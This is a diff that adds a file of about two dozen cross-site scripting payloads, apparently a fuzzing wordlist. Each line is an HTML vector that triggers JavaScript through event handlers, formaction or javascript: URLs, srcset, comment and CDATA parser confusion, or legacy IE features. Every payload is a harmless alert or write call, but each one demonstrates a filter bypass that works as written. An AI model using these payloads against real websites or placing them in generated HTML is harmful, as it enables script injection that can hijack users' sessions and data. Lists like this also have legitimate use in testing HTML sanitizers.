@@ -1,0 +1,25 @@
+<form id="test"></form><button form="test" formaction="javascript:alert(1)">X</button>
+<input onfocus=write(1) autofocus>
+<input onblur=write(1) autofocus><input autofocus>
+<video poster=javascript:alert(1)//></video>
+<body onscroll=alert(1)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
+<form id=test onforminput=alert(1)><input></form><button form=test onformchange=alert(2)>X</button>
+<video><source onerror="alert(1)">
+<video onerror="alert(1)"><source></source></video>
+<form><button formaction="javascript:alert(1)">X</button>
+<body oninput=alert(1)><input autofocus>
+<math href="javascript:alert(1)">CLICKME</math>
+<picture><source srcset="x"><img onerror="alert(1)"></picture>
+<picture><img srcset="x" onerror="alert(1)"></picture>
+<img srcset=",,,,,x" onerror="alert(1)">
+<details open ontoggle="alert(1)">
+<video src onratechange="alert(1)">
+<table background="javascript:alert(1)"></table>
+<!--<img src="--><img src=x onerror=alert(1)//">
+<comment><img src="</comment><img src=x onerror=alert(1)//">
+<svg><![CDATA[><image xlink:href="]]><img src=xx:x onerror=alert(2)//"></svg>
+<!--<img src="--><img src=x onerror=alert(1)//">
+<style><img src="</style><img src=x onerror=alert(1)//">
+<SCRIPT FOR=document EVENT=onreadystatechange>alert(1)</SCRIPT>
+<b <script>alert(1)//</script>0</script></b>
+<div style=width:1px;filter:glow onfilterchange=alert(1)>x</div>
